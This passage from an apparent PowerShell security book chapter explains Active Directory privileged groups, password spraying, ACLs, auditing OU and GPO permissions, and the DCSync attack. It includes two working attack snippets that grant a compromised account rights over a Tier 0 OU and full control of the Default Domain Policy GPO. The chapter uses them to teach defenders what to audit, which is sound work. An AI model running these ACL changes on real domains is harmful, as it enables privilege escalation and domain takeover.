			<p>Built-in privileged accounts also<a id="_idIndexMarker989"/> exist in<a id="_idIndexMarker990"/> AD, such<a id="_idIndexMarker991"/> as<a id="_idIndexMarker992"/> the <strong class="bold">administrator account</strong>, the <strong class="bold">Guest account</strong>, the <strong class="bold">HelpAssistant account</strong>, and<a id="_idIndexMarker993"/> the <strong class="bold">krbtgt account</strong> (which is responsible for <span class="No-Break">Kerberos operations).</span></p>
			<p>If you want to read more about AD built-in accounts, please refer to the official <span class="No-Break">documentation: </span><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts"><span class="No-Break">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts</span></a><span class="No-Break">.</span></p>
			<h2 id="_idParaDest-153"><a id="_idTextAnchor161"/>Built-in privileged groups in AD</h2>
			<p>In AD, there are <a id="_idIndexMarker994"/>some<a id="_idIndexMarker995"/> predefined <a id="_idIndexMarker996"/>roles such as the <strong class="bold">Enterprise</strong> or <strong class="bold">Domain Administrator</strong> roles, but<a id="_idIndexMarker997"/> those <a id="_idIndexMarker998"/>are not the <span class="No-Break">only ones.</span></p>
			<p>Those predefined roles reside in the <strong class="source-inline">Builtin</strong> container of your domain. To query it you can use the <strong class="source-inline">Get-ADGroup</strong> cmdlet and specify<a id="_idIndexMarker999"/> the <strong class="bold">Distinguished Name</strong> (<strong class="bold">DN</strong>) of your domain-specific <strong class="source-inline">Builtin</strong> container as <strong class="source-inline">-Searchbase</strong>; using this parameter, you can define in which unit you perform <span class="No-Break">the command.</span></p>
			<p>So, if I want to search in the <strong class="source-inline">Builtin</strong> container of my <strong class="source-inline">PSSec.local</strong> domain, I would specify <strong class="source-inline">CN=Builtin,DC=PSSec,DC=local</strong> <span class="No-Break">as </span><span class="No-Break"><strong class="source-inline">-Searchbase</strong></span><span class="No-Break">:</span></p>
			<p><strong class="source-inline">Get-ADGroup -SearchBase 'CN=Builtin,DC=PSSec,DC=local' -Filter * | </strong><span class="No-Break"><strong class="source-inline">Format-Table Name,GroupScope,GroupCategory,SID</strong></span></p>
			<p>As I want to find all built-in accounts, I <a id="_idIndexMarker1000"/>specify a <strong class="bold">wildcard</strong> (<strong class="source-inline">*</strong>) as <strong class="source-inline">-Filter</strong>. Piping the command to <strong class="source-inline">Format-Table</strong> allows you to define what data you want to see in a formatted table, which you can see an example of in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer156">
					<img alt="Figure 6.4 – Displaying all existing AD groups" src="image/B16679_06_004.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.4 – Displaying all existing AD groups</p>
			<p>The <a id="_idIndexMarker1001"/>command <a id="_idIndexMarker1002"/>finds all built-in accounts in the <strong class="source-inline">Builtin</strong> container and formats the output into a table. However, if you don’t have the <strong class="source-inline">ActiveDirectory</strong> module present, you can use <strong class="source-inline">[adsisearcher]</strong> with an LDAP filter to achieve the same task. The following command will search for all groups with the <span class="No-Break"><strong class="source-inline">objectClass=group</strong></span><span class="No-Break"> filter:</span></p>
			<pre class="source-code">
&gt; ([adsisearcher]"(&amp;(objectClass=group)(cn=*))").FindAll()</pre>
			<p>Although those predefined groups cannot be moved outside of the <strong class="source-inline">Builtin</strong> container, there’s a chance to create other <span class="No-Break">accounts inside.</span></p>
			<p>Therefore, you might want to tweak your command a little bit more to only search for accounts in the <strong class="source-inline">Builtin</strong> container that have a <a id="_idIndexMarker1003"/>well-known <strong class="bold">security </strong><span class="No-Break"><strong class="bold">identifier</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">SID</strong></span><span class="No-Break">).</span></p>
			<h3>Where do those built-in groups come from?</h3>
			<p>When these<a id="_idIndexMarker1004"/> built-in groups were created, Microsoft initially wanted to make it easier for system administrators, so that they have some preconfigured groups that work out of the box for certain <span class="No-Break">use cases.</span></p>
			<p>And they did! Those built-in groups are still used by some organizations today. Companies who enjoyed not looking up in a complex way which user privileges they needed to assign to their backup account could just add their account to the group and had nothing more <span class="No-Break">to configure.</span></p>
			<p>Adversaries, though, have discovered these groups for their own purposes as well: groups that are publicly documented, that have way too many privileges, and the same well-known SID in every environment all around the world – doesn’t that <span class="No-Break">sound amazing?</span></p>
			<p>That means that it is much easier to attack those built-in groups: no need to discover which groups are available if adversaries can already hardcode the well-known SIDs of those publicly documented <span class="No-Break">built-in groups.</span></p>
			<p>So, what was meant well, in the beginning, could also be used against the original purpose. Unfortunately, too many companies have started using these groups in their production environment, so there’s no option to just remove those built-in groups by default to be <span class="No-Break">downward compatible.</span></p>
			<p>Nevertheless, from a security point of view, I recommend not using all these built-in groups anymore: rather, create your own group (which doesn’t have a well-known SID) and delegate only <span class="No-Break">needed privileges.</span></p>
			<p>The following groups are reasonable built-in groups that can and should be <span class="No-Break">still used:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Enterprise Admins</strong></span></li>
			</ul>
			<p>A <a id="_idIndexMarker1005"/>well-known SID is <span class="No-Break"><strong class="source-inline">S-1-5-21&lt;root domain&gt;-519</strong></span><span class="No-Break">.</span></p>
			<p>Members<a id="_idIndexMarker1006"/> in this group can make forest-wide changes. This is the group with the highest privileges in <span class="No-Break">a forest.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Domain Admins</strong></span></li>
			</ul>
			<p>A <a id="_idIndexMarker1007"/>well-known SID <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">S-1-5-21&lt;domain&gt;-512</strong></span><span class="No-Break">.</span></p>
			<p>Members<a id="_idIndexMarker1008"/> in this group can administer the domain. After the enterprise administrator group, this is the group with the highest privileges in <span class="No-Break">a domain.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Schema Admins</strong></span></li>
			</ul>
			<p>A<a id="_idIndexMarker1009"/> well-known SID is <span class="No-Break"><strong class="source-inline">S-1-5-21&lt;root domain&gt;-518</strong></span><span class="No-Break">.</span></p>
			<p>Schema Admin group <a id="_idIndexMarker1010"/>members have the authorization to make modifications to the <span class="No-Break">AD schema.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Built-in Admins</strong></span></li>
			</ul>
			<p>A <a id="_idIndexMarker1011"/>well-known SID <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">S-1-5-32-544</strong></span><span class="No-Break">.</span></p>
			<p>Members<a id="_idIndexMarker1012"/> in this group are administrators on the local system, which means that they are local administrators on all domain controllers in the domain <span class="No-Break">as well.</span></p>
			<p>Built-in groups that have too many privileges and should not be used anymore are <span class="No-Break">the following:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Backup Operators</strong></span></li>
			</ul>
			<p>A <a id="_idIndexMarker1013"/>well-known SID <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">S-1-5-32-551</strong></span><span class="No-Break">.</span></p>
			<p>Backup operators <a id="_idIndexMarker1014"/>possess the ability to perform complete backups and restores of all files on a computer, regardless of file permissions. Even if they lack access to protected files, backup operators can still backup and restore those files. They also can log on to and shut down the computers for which they hold Backup <span class="No-Break">Operator rights.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Account Operators</strong></span></li>
			</ul>
			<p>A well-known SID <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">S-1-5-32-548</strong></span><span class="No-Break">.</span></p>
			<p>Account operators<a id="_idIndexMarker1015"/> have permission<a id="_idIndexMarker1016"/> to create, modify, and delete accounts for users, groups, and computers in all containers and OUs of AD except the <strong class="source-inline">Builtin</strong> container and the domain controllers OU. They cannot modify the administrators or domain <span class="No-Break">administrators group.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Print Operators</strong></span></li>
			</ul>
			<p>A <a id="_idIndexMarker1017"/>well-known SID <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">S-1-5-32-550</strong></span><span class="No-Break">.</span></p>
			<p>Members <a id="_idIndexMarker1018"/>of the print operators group have the capability to manage printers and <span class="No-Break">document queues.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="bold">Server Operators</strong></span></li>
			</ul>
			<p>A well-known SID <span class="No-Break">is </span><span class="No-Break"><strong class="source-inline">S-1-5-32-549</strong></span><span class="No-Break">.</span></p>
			<p>Server <a id="_idIndexMarker1019"/>operators <a id="_idIndexMarker1020"/>can log on to a server interactively, create and delete network shares, start and stop services, backup and restore files, format the hard disk, and shut down the computer. Be careful who you assign a server operator role to on a <span class="No-Break">domain controller.</span></p>
			<p>Of course, there are more built-in groups than just the ones mentioned and it makes sense to verify that those groups are assigned carefully with respect to the <span class="No-Break">least-privilege principle.</span></p>
			<p>If you want to learn more about which well-known SID belongs to which built-in group or account, you can refer to the official <span class="No-Break">documentation: </span><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows"><span class="No-Break">https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows</span></a><span class="No-Break">.</span></p>
			<h1 id="_idParaDest-154"><a id="_idTextAnchor162"/>Password spraying</h1>
			<p>Password spraying<a id="_idIndexMarker1021"/> is like a brute force attack and can help attackers identify and abuse accounts with weak passwords. Password spraying is a slow and methodical approach where the attacker tries a list of common and known passwords on a large number of accounts. In contrast, a brute force attack involves an attacker trying a large number of potential passwords, typically against a single account, in <span class="No-Break">rapid succession.</span></p>
			<p>If a login is successful using such a guessed password, the attacker gains control over the designated account and can use it to move laterally and get more credentials or <span class="No-Break">interesting data.</span></p>
			<p>There are many open source scripts and modules available that adversaries can use for a password spray attack, including <span class="No-Break">the following:</span></p>
			<ul>
				<li><a href="https://github.com/dafthack/domainPasswordSpray"><span class="No-Break">https://github.com/dafthack/domainPasswordSpray</span></a></li>
				<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon"><span class="No-Break">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</span></a></li>
			</ul>
			<h2 id="_idParaDest-155"><a id="_idTextAnchor163"/>Mitigation</h2>
			<p>It is hard<a id="_idIndexMarker1022"/> to detect password spraying in your on-prem AD. Although you can see failed logons in the <em class="italic">Security</em> event log as event <strong class="source-inline">4625</strong>, it still can be hard to differentiate password spray attacks from legitimate authentication attempts if the adversary is careful enough. Many attackers are also slowing down the frequency, so that the account does not get locked out or that it isn’t too obvious for someone who monitors <span class="No-Break">the environment.</span></p>
			<p>Configuring a password policy can help to enforce longer and more complex passwords. In general, I recommend enforcing more complex and long passwords but refrain from forcing too-quick password change cycles. If a user has to change their password every three months, they are desperate to find a good new password and come up with passwords such as “Spring2023!” <span class="No-Break">or “Summer2023!”.</span></p>
			<p>Also, educate your users on proper passwords such as using passphrases. The following comic from the popular website <a href="http://xkcd.com">xkcd.com</a> (by Randall Munroe) provides a great example of good versus bad passwords (<span class="No-Break">source: </span><a href="https://xkcd.com/936/"><span class="No-Break">https://xkcd.com/936/</span></a><span class="No-Break">):</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer157">
					<img alt="Figure 6.5 – “Password strength” from xkcd (source: https://xkcd.com/936/)" src="image/B16679_06_005.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.5 – “Password strength” from xkcd (source: https://xkcd.com/936/)</p>
			<p>AAD also provides<a id="_idIndexMarker1023"/> some mitigations against password spraying (although this attack is <span class="No-Break">still possible).</span></p>
			<h1 id="_idParaDest-156"><a id="_idTextAnchor164"/>Access rights</h1>
			<p>Access control<a id="_idIndexMarker1024"/> can be configured to allow one or multiple users access to a certain resource. Depending on what can be done with each level of access, configuring and maintaining access right configurations is <span class="No-Break">highly sensitive.</span></p>
			<p>Also, in AD, resources are restricted using access control. In this section, let’s have a look at the basics and how to <span class="No-Break">audit access.</span></p>
			<h2 id="_idParaDest-157"><a id="_idTextAnchor165"/>What is a SID?</h2>
			<p>A SID is <a id="_idIndexMarker1025"/>a <a id="_idIndexMarker1026"/>unique ID of an account and the primary identifier. It does not change for the lifetime of an account. This allows the concept of renaming users without causing any access or <span class="No-Break">security issues.</span></p>
			<p>There are some well-known SIDs available in every environment – the only difference is the domain ID, which was added to the beginning of <span class="No-Break">the SID.</span></p>
			<p>For example, the well-known SID of the built-in domain administrator follows this <span class="No-Break">schema: </span><span class="No-Break"><strong class="source-inline">S-1-5-21-&lt;domain&gt;-500</strong></span><span class="No-Break">.</span></p>
			<p>The last number group represents the user number: in this case, <strong class="source-inline">500</strong> is a reserved, well-known SID. Well-known SIDs are the same in all environments, except for the domain part. Normal account SID user numbers start <span class="No-Break">from </span><span class="No-Break"><strong class="source-inline">1000</strong></span><span class="No-Break">.</span></p>
			<p>If you are interested to read more about well-known SIDs, feel free to explore the <span class="No-Break">official documentation:</span></p>
			<ul>
				<li><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows"><span class="No-Break">https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows</span></a></li>
				<li><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids"><span class="No-Break">https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids</span></a></li>
			</ul>
			<p>If we are looking at the SID of the built-in domain administrator in my <strong class="source-inline">PSSec.local</strong> demo environment, that would be the following SID – with the individual <em class="italic">domain part highlighted </em><span class="No-Break"><em class="italic">in italics:</em></span></p>
			<p><span class="No-Break"><strong class="source-inline">S-1-5-21-</strong></span><span class="No-Break"><em class="italic">3035173261-3546990356-1292108877</em></span><span class="No-Break"><strong class="source-inline">-500</strong></span></p>
			<p>To find out the SID of an AD user account, you can leverage the <strong class="source-inline">Get-ADUser</strong> cmdlet, which is part of the <strong class="source-inline">ActiveDirectory</strong> module, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer158">
					<img alt="Figure 6.6 – Displaying the SID using Get-ADUser" src="image/B16679_06_006.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.6 – Displaying the SID using Get-ADUser</p>
			<p>Windows <a id="_idIndexMarker1027"/>uses SIDs in access control lists to grant or deny access<a id="_idIndexMarker1028"/> to a specific resource. In this case, SIDs are used to uniquely identify users <span class="No-Break">or groups.</span></p>
			<h2 id="_idParaDest-158"><a id="_idTextAnchor166"/>Access control lists</h2>
			<p>An <strong class="bold">access control list</strong> (<strong class="bold">ACL</strong>) is a<a id="_idIndexMarker1029"/> list that controls permissions<a id="_idIndexMarker1030"/> to access a resource in on-premises AD. It can consist of <a id="_idIndexMarker1031"/>various <strong class="bold">access control entries</strong> (<strong class="bold">ACEs</strong>), and each ACE contains information regarding who is allowed to access what – for example, is a trustee allowed to access a certain resource, or is the access denied or <span class="No-Break">even audited?</span></p>
			<p>A securable object’s security descriptor can have two types of ACLs – a <strong class="bold">discretionary access control list</strong> (<strong class="bold">DACL</strong>) and a <strong class="bold">system access control </strong><span class="No-Break"><strong class="bold">list</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">SACL</strong></span><span class="No-Break">):</span></p>
			<ul>
				<li><strong class="bold">DACL</strong>: A DACL<a id="_idIndexMarker1032"/> specifies the trustees that are granted or denied access to an object protected by <span class="No-Break">the ACL.</span></li>
				<li><strong class="bold">SACL</strong>: A SACL <a id="_idIndexMarker1033"/>enables administrators to audit and log when someone tries to access a <span class="No-Break">secured object.</span></li>
			</ul>
			<p>If no DACL exists for an object, every user has full access to it. See the following link for more information on how DACLs and ACEs work in <span class="No-Break">Windows: </span><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces"><span class="No-Break">https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces</span></a><span class="No-Break">.</span></p>
			<h3>Access control entries</h3>
			<p>An ACE is <a id="_idIndexMarker1034"/>one access entry that contains the following information to <a id="_idIndexMarker1035"/>specify who has access to <span class="No-Break">which resource:</span></p>
			<ul>
				<li><strong class="bold">Trustee</strong>: The trustee is specified by <span class="No-Break">its SID.</span></li>
				<li><strong class="bold">Access mask</strong>: Determines<a id="_idIndexMarker1036"/> the specific access rights controlled by <span class="No-Break">this ACE.</span></li>
				<li>ACE type <span class="No-Break">indicative flag.</span></li>
				<li>A set of bit flags that control the inheritance for child objects from <span class="No-Break">this ACE.</span></li>
			</ul>
			<p>There are six types of ACEs – three types that are applicable to all securable objects and three additional types that are specific to directory <span class="No-Break">service objects:</span></p>
			<ul>
				<li><strong class="bold">Access-denied ACE</strong>: Supported<a id="_idIndexMarker1037"/> by all <a id="_idIndexMarker1038"/>securable objects. Can be used in DACLs to deny access to the trustee specified by <span class="No-Break">this ACE.</span></li>
				<li><strong class="bold">Access-allowed ACE</strong>: Supported <a id="_idIndexMarker1039"/>by all <a id="_idIndexMarker1040"/>securable objects. Can be used in DACLs to allow access to the trustee specified by <span class="No-Break">this ACE.</span></li>
				<li><strong class="bold">System-audit ACE</strong>: Supported<a id="_idIndexMarker1041"/> by <a id="_idIndexMarker1042"/>all securable objects. Can be used in a SACL to audit when the trustee makes use of the <span class="No-Break">assigned rights.</span></li>
				<li><strong class="bold">Access-denied object ACE</strong>: Specific<a id="_idIndexMarker1043"/> to directory service objects. Can be utilized in DACLs to<a id="_idIndexMarker1044"/> prohibit access to a property or property set on the object or to <span class="No-Break">restrict inheritance.</span></li>
				<li><strong class="bold">Access-allowed object ACE</strong>: Specific <a id="_idIndexMarker1045"/>to <a id="_idIndexMarker1046"/>directory service objects. Can be utilized in DACLs to grant access to a property or property set on the object or to <span class="No-Break">restrict inheritance.</span></li>
				<li><strong class="bold">System-audit object ACE</strong>: Specific <a id="_idIndexMarker1047"/>to <a id="_idIndexMarker1048"/>directory service objects. Can be utilized in a SACL to record the attempts made by a trustee to access a property or property set on <span class="No-Break">the object.</span></li>
			</ul>
			<p>It is also possible to <a id="_idIndexMarker1049"/>manage ACLs using the PowerShell <strong class="source-inline">Get-Acl</strong> and <span class="No-Break"><strong class="source-inline">Set-Acl</strong></span><span class="No-Break"> cmdlets:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">Get-Acl</strong></span><span class="No-Break">: </span><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl "><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl</span></a></li>
				<li><span class="No-Break"><strong class="source-inline">Set-Acl</strong></span><span class="No-Break">: </span><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl "><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl</span></a></li>
			</ul>
			<p>For example, to <a id="_idIndexMarker1050"/>access the ACLs of a user account object, you would use the <strong class="source-inline">Get-ACL "AD:$((Get-ADUser testuser).distinguishedname)").access</strong> command. Next, let us explore <span class="No-Break">OU ACLs.</span></p>
			<h2 id="_idParaDest-159"><a id="_idTextAnchor167"/>OU ACLs</h2>
			<p>OUs are<a id="_idIndexMarker1051"/> the <a id="_idIndexMarker1052"/>units in which AD objects can be sorted. Depending on the configuration, different accounts or groups can have administrative access to an OU, and different GPOs can be applied <span class="No-Break">to them.</span></p>
			<p>If OU access rights are misconfigured, this offers adversaries a lot of possibilities. One common attack vector in AD environments is through the modification of <span class="No-Break">OU permissions.</span></p>
			<h3>Changing OU permissions</h3>
			<p>By modifying<a id="_idIndexMarker1053"/> the permissions of an OU, an attacker can gain control over the objects within it, including user and computer accounts, and potentially escalate privileges within <span class="No-Break">the domain.</span></p>
			<p>Let’s say, for example, an attacker gained access to AD and wanted to grant themselves permission to read and modify objects in a specific OU. Let’s assume that the adversary gained control over the <strong class="source-inline">PSSec\vvega</strong> account beforehand, so they use this account to grant themselves read and modify objects permissions, which could be easily done by accessing the OU ACLs, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
$TargetOU = "OU=Accounts,OU=Tier 0,DC=PSSec,DC=local"
$AttackerIdentity=[System.Security.Principal.NTAccount]'PSSec\vvega'
$Ou = [ADSI]"LDAP://$TargetOU"
$Sec = $Ou.psbase.ObjectSecurity
$Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AttackerIdentity, "ReadProperty, WriteProperty", "Allow")
$Sec.AddAccessRule($Ace)
$Ou.psbase.CommitChanges()</pre>
			<p>In <a id="_idIndexMarker1054"/>order to grant the <strong class="source-inline">PSSec\vvega</strong> account control over the <strong class="source-inline">OU=Accounts,OU=Tier 0,DC=PSSec,DC=local</strong> OU, the adversary first specifies it as the target OU. As a next step, they retrieve the object security of the OU, create a new <strong class="source-inline">ActiveDirectoryAccessRule</strong> for the attacker with read and write property permissions, add the access rule to the object security, and finally, commit the changes to grant the attacker access to <span class="No-Break">the OU.</span></p>
			<p>So, as a blue teamer, it’s better to monitor on a regular basis which ACLs are configured and fix them before an attacker uses them for their <span class="No-Break">own purposes.</span></p>
			<h3>Monitoring and enumerating OU permissions</h3>
			<p>For<a id="_idIndexMarker1055"/> this purpose, I have written the <strong class="source-inline">Get-OuACLSecurity.ps1</strong> script, which<a id="_idIndexMarker1056"/> can be found in this book’s GitHub <span class="No-Break">repository:</span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/blob/master/Chapter06/Get-OuACLSecurity.ps1"><span class="No-Break"> </span></a><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-OuACLSecurity.ps1"/><span class="No-Break">.</span></p>
			<p>It relies on the <strong class="source-inline">Get-ADOrganizationalUnit</strong> and <span class="No-Break"><strong class="source-inline">Get-ACL</strong></span><span class="No-Break"> cmdlets.</span></p>
			<p>Using <strong class="source-inline">Get-ADOrganizationalUnit</strong>, you can see the name, the distinguished name, and<a id="_idIndexMarker1057"/> <span class="No-Break">linked GPOs:</span></p>
			<pre class="source-code">
&gt; Get-ADOrganizationalUnit -Filter * | Out-GridView</pre>
			<p>If you don’t have the <strong class="source-inline">ActiveDirectory</strong> module available, you can use the <strong class="source-inline">[adsisearcher]</strong> type accelerator to perform LDAP searches against AD. Here’s an example that retrieves all OUs in the current domain using the <strong class="source-inline">objectCategory</strong> filter <span class="No-Break">for OUs:</span></p>
			<pre class="source-code">
&gt; ([adsisearcher]"objectCategory=organizationalUnit").FindAll()</pre>
			<p>And using <strong class="source-inline">Get-Acl</strong>, you can see which access rights are configured for <span class="No-Break">each OU:</span></p>
			<pre class="source-code">
&gt; Get-Acl -Path "AD:\$(<strong class="bold">&lt;DistinguishedName&gt;</strong>)").Access</pre>
			<p>The easiest way to assess the OU ACL security of your environment is to run the <strong class="source-inline">Get-OuACLSecurity.ps1</strong> script and export it as <strong class="source-inline">.csv</strong> to then import and analyze it <span class="No-Break">in Excel:</span></p>
			<pre class="source-code">
&gt; .\Get-OuACLSecurity.ps1 | Export-Csv -Path C:\tmp\OuAcls.csv</pre>
			<p>Again, I have created a sample analysis file and uploaded it into our GitHub <span class="No-Break">repository: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06/OU-ACLs"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/tree/master/Chapter06/OU-ACLs</span></a><span class="No-Break">.</span></p>
			<p>Some<a id="_idIndexMarker1058"/> access <a id="_idIndexMarker1059"/>rights are automatically generated, so if you did not harden your AD OU access rights yet, that’s a task that you want to do as soon <span class="No-Break">as possible.</span></p>
			<p>I have also marked some accounts in the <em class="italic">OuACLs Pivot</em> Power Pivot view of the <strong class="source-inline">ACLPivot.xlsx</strong> file, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer159">
					<img alt="Figure 6.7 – Power Pivot analysis of the OU access rights" src="image/B16679_06_007.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.7 – Power Pivot analysis of the OU access rights</p>
			<p>For example, access <a id="_idIndexMarker1060"/>rights built-in groups<a id="_idIndexMarker1061"/> such as <strong class="bold">Account Operators</strong> or <strong class="bold">Print Operators</strong> are automatically<a id="_idIndexMarker1062"/> added if you deploy AD. As described<a id="_idIndexMarker1063"/> in the previous section, <em class="italic">Where do those built-in groups come from?</em>, they were originally meant to make your life easier, but nowadays, they are also making adversaries’ <span class="No-Break">lives easier.</span></p>
			<p>There are also some access rights for <strong class="bold">Everyone</strong> configured. This is an artifact from the earlier days and is kept in case a legacy AD is connected. You want to remove those access rights as soon as possible. In a modern AD environment, it is enough if only <strong class="bold">Authenticated Users</strong> <span class="No-Break">have </span><span class="No-Break"><a id="_idIndexMarker1064"/></span><span class="No-Break">access.</span></p>
			<p>Last but not least, if you don’t have any pre-Windows 2000 legacy systems running in your environment, you want to<a id="_idIndexMarker1065"/> remove the <strong class="bold">Pre-Windows 2000 Compatible Access</strong> <span class="No-Break">built-in group.</span></p>
			<h2 id="_idParaDest-160"><a id="_idTextAnchor168"/>GPO ACLs</h2>
			<p>GPOs are a <a id="_idIndexMarker1066"/>critical component of many AD environments, as they are <a id="_idIndexMarker1067"/>used to enforce security policies and configurations across the domain. If an attacker gains control over a GPO, they can use it to propagate malicious settings across the domain, potentially compromising the security of the <span class="No-Break">entire network.</span></p>
			<p>If, for example, an attacker gained access to an account that has permissions to modify the access controls for Group Policies, they could use the following demo code to add their own account (which they either created or compromised earlier) in order to be in the position to change the <span class="No-Break">GPO itself:</span></p>
			<pre class="source-code">
$Searcher = [adsisearcher]"(&amp;(objectClass=groupPolicyContainer)(displayName=Default domain Policy))"
$Searcher.SearchRoot = [adsi]"LDAP://CN=Policies,CN=System,DC=PSSec,DC=local"
$Searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null
$SearchResult = $Searcher.FindOne()
$DistinguishedName = $SearchResult.Properties["distinguishedName"][0]
$TargetGPO = $DistinguishedName
$AttackerIdentity=[System.Security.Principal.NTAccount]'PSSec\vvega'
$Gpo = [ADSI]"LDAP://$TargetGPO"
$Sec = $Gpo.psbase.ObjectSecurity
$Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AttackerIdentity, "GenericAll", "Allow")
$Sec.AddAccessRule($Ace)
$Gpo.psbase.CommitChanges()</pre>
			<p>The code <a id="_idIndexMarker1068"/>snippet first searches for the distinguished name of the default domain policy using an ADSI searcher and sets it as the target GPO for permission changes. It then specifies the identity of the attacker in the <strong class="source-inline">$AttackerIdentity</strong> variable and creates a new access rule to grant them <strong class="source-inline">GenericAll</strong> permissions on the target GPO. The <strong class="source-inline">GenericAll</strong> permission right is a predefined security principle that grants all possible access rights to a particular object or resource in AD; in other words, it provides full control over <span class="No-Break">the object.</span></p>
			<p>Finally, the <a id="_idIndexMarker1069"/>script commits the changes to the object security of the GPO, effectively granting the attacker full control over the default domain policy. This could allow the attacker to modify the GPO’s settings, including security settings, and potentially take over control of the <span class="No-Break">entire domain.</span></p>
			<p>Make sure to regularly check GPO ACLs in your domain. You can view GPO access rights by combining the <strong class="source-inline">Get-Gpo</strong> and <strong class="source-inline">Get-GPPermission</strong> cmdlets, which are part of the <strong class="source-inline">GroupPolicy</strong> module. The <strong class="source-inline">GroupPolicy</strong> module can be installed by installing the RSAT tools. More information on this module can be found <span class="No-Break">here: </span><a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/grouppolicy/</span></a><span class="No-Break">.</span></p>
			<p>As an example of how to audit your GPO access rights, I have written a script and uploaded it to this book’s GitHub <span class="No-Break">repository: </span><a href="https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-GpoAcls.ps1"><span class="No-Break">https://github.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/blob/master/Chapter06/Get-GpoAcls.ps1</span></a><span class="No-Break">.</span></p>
			<p>Similar to the OU ACL example, you can create a pivot table in Excel to assess the GPO ACLs in <span class="No-Break">your environment.</span></p>
			<h2 id="_idParaDest-161"><a id="_idTextAnchor169"/>Domain ACLs</h2>
			<p>It is also<a id="_idIndexMarker1070"/> of special interest which access rights are configured <a id="_idIndexMarker1071"/>for the AD domain itself. These access rights control who has permissions to replicate objects in the domain or perform other sensitive domain operations. The <strong class="source-inline">domainDNS</strong> ACLs are crucial as they grant domain controllers and domain admins the ability to perform all their necessary functions and operations within <span class="No-Break">the domain.</span></p>
			<p>In addition, access <a id="_idIndexMarker1072"/>granted at the root of the domain is usually inherited by <a id="_idIndexMarker1073"/>all child objects; therefore, it makes sense to directly adjust them at the <span class="No-Break">root level.</span></p>
			<p>You can audit what ACLs are configured on the domain level using the following commands: <strong class="source-inline">(Get-Acl -Path "AD:\$((Get-ADdomain).DistinguishedName)").Access | </strong><span class="No-Break"><strong class="source-inline">Out-GridView</strong></span><span class="No-Break">.</span></p>
			<h3>DCSync</h3>
			<p>The<a id="_idIndexMarker1074"/> DCSync attack <a id="_idIndexMarker1075"/>is a technique where an attacker imitates a domain controller’s behavior and tricks other domain controllers to replicate AD-specific information (for example, <strong class="bold">NT Lan Manager</strong> (<strong class="bold">NTLM</strong>) hashes <a id="_idIndexMarker1076"/>and other credential-related data) to the attacker. For this attack, the <strong class="bold">Microsoft Directory Replication Service Remote</strong> (<strong class="bold">MS-DRSR</strong>) protocol<a id="_idIndexMarker1077"/> is abused, which is basically an essential and legitimate feature of AD and therefore, cannot simply <span class="No-Break">be disabled.</span></p>
			<p>The DCSync attack allows an attacker to impersonate a domain controller and request password data for a specific user, even if they do not have direct access to the user’s computer or account. The attacker can then use these hashes to perform lateral movement and privilege escalation within <span class="No-Break">the network.</span></p>
